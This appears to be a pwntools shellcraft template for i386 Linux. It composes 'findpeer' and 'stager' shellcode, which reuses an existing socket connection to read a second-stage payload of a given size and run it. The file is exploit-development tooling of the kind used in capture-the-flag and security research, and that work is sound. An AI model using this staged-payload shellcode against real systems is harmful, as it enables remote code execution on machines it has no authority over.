<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.i386 import linux %>
<%docstring>
Findpeer + stager
Args:
    size, the size of the payload
    port, the port given to findpeer (defaults to any)
</%docstring>
<%page args="size, port = None"/>

${linux.findpeer(port)}
${linux.stager("esi", size)}
